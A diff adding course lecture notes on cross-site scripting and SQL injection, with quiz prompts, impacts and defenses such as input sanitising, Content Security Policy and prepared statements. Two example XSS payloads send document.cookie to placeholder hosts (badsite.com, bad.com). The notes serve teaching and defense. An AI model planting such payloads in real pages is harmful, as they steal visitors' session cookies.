@@ -1,0 +1,88 @@
+---
+layout: ../../../semesters/Winter2024Markdown.astro
+---
+
+# XSS and SQL injection
+
+## Ungraded Quiz
+
+- use an example to explain how a stored XSS attack works
+- use an example to explain how a SQL injection attack works
+
+## Key concepts
+
+### XSS: cross-site scripting
+
+- injecting malicious scripts into HTML tags or or web pages 0 rendering the
+  HTML causes the script to be executed
+
+- _stored/persistent XSS_:
+
+```HTML
+Here is a picture of my dog <img id="mydogpic" src="dog.jpg">
+  <script>document.getElementById("mydogpic").src="http://badsite.com/dog.jpg?arg1=" + document.cookie </script>
+```
+
+- _websites must sanitize input!_
+
+- _reflected (non-persistent) XSS_:
+
+```HTML
+Our favorite site for deals is www.good.com:  <a href=’http://www.good.com/ <script>document.location="http://bad.com/dog.jpg?arg1="+document.cookie; </script>’> Click here </a>
+```
+
+- takes advantage of a site that returns 404 errors with
+  `File-not-found: filepath-requested`
+
+- _DOM-based XSS_
+
+  - see [DOM-based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
+
+- [see Figure 9.6, page 264](https://people.scs.carleton.ca/~paulv/toolsjewels/TJrev1/ch9-rev1.pdf)
+
+- for another source on XSS attacks, see
+  [types of cross-site scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
+
+- XSS impacts
+
+  - once you allow an attacker to inject JavaScript, they can do a lot
+  - browser redirection
+  - access cookies
+  - access browser-stored data for a website
+  - rewrite the document being displayed
+  - exploit browser vulnerabilities
+
+- defenses
+  - sanitize input by removing tags
+  - [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+    - server can specify which domains are allowed to execute scripts
+
+### SQL Injection
+
+- why a vulnerability exists
+
+  - databases store information in tables
+  - scripts construct SQL queries
+  - scripts use input from cookies, variables, users
+
+- SQL injection
+
+  - crafting input so an attacker chooses an SQL command to be executed
+  - extraction
+  - modification
+  - unauthorized account access
+  - denial of service
+
+- see
+  [Examples, page 267 and 268](https://people.scs.carleton.ca/~paulv/toolsjewels/TJrev1/ch9-rev1.pdf)
+
+- see [Example, page]
+
+- defenses
+
+  - _escaping_ problematic characters
+  - _denylists_: filtering out denied commands
+  - _positive validation_: only allowing certain commands
+
+  - see
+    [prepared statements, OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
